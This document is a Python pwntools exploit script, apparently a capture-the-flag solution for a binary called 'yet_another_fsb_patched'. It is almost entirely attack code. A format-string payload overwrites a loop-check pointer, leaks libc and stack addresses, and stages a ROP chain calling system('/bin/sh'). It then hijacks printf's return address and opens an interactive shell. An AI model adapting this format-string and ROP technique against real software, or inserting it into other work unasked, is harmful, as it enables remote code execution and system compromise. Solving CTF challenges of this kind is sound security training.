```python3
#!/usr/bin/env python3

from pwn import *
import time

'''
p = gdb.debug("./yet_another_fsb_patched", gdbscript="""
    b *main+62
    b *main+86
    c
""")
'''

#HOST = "6a22e2b94f04e6c78562a7f2b1d71cda.chal.ctf.ae"
#p = remote(HOST, 443, ssl=True, sni=HOST)
p = process("./yet_another_fsb_patched")

# overwrite the double pointer with 0xe38e (this pointer is checked for loop)
p_offset = 62
target = int(0xe38e)
payload = "%c" * (p_offset - 2) + f"%{target - (p_offset - 2)}c" + "%hn"

# write some value at 0xe38e pointing to pass the check
# this will return back to main
# leak libc and stack addresses on the way...
payload += "%10c%79$hhn"
payload += "aaaa"
payload += "%39$llx %41$llx"
p.sendline(payload)

p.recvuntil("aaaa")
leak = p.recvline()
print(leak)

printf_ret = int(leak[:12], 16) - 576
print(f"printf ret at: {hex(printf_ret)}")

libc_base = int(leak[13:][:12], 16) - 154760
print(f"libc base at: {hex(libc_base)}")

pop_rdi = libc_base + 0x00000000000fd8c4
add_rsp = libc_base + 0x00000000000e0493 
binsh = libc_base + 1748520
system = libc_base + 331536
ret = libc_base + 0x0000000000024655 

print(f"pop_rdi at: {hex(pop_rdi)}")
print(f"binsh at: {hex(binsh)}")
print(f"system at: {hex(system)}")
print(f"rsp add at: {hex(add_rsp)}")
print(f"ret for stack alignment: {hex(ret)}")

add_rsp1 = int(hex(add_rsp)[:6], 16)
add_rsp2 = int(hex(add_rsp)[6:][:4], 16)
add_rsp3 = int(hex(add_rsp)[10:], 16)

print(hex(add_rsp1))
print(hex(add_rsp2))
print(hex(add_rsp3))

time.sleep(2)


# prepare pointers for printf's ret and ROP Chain on the stack
# padding 
payload = b"a" * 64
payload += p64(printf_ret)
payload += p64(printf_ret+2)
payload += p64(printf_ret+4)

# ROP chain
# rsp will point here (add rsp, 0x60)
# padding for pops
payload += p64(0xaa) * 4
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

p.sendline(payload)

time.sleep(1)

# overwrite printf's ret to return at our ROP chain
payload = f"%{add_rsp3}c%14$hn"
payload += f"%{(add_rsp1 - add_rsp3)}c%16$hn"
payload += f"%{(add_rsp2 - add_rsp1)}c%15$hn"

p.sendline(payload)   

p.interactive()
```
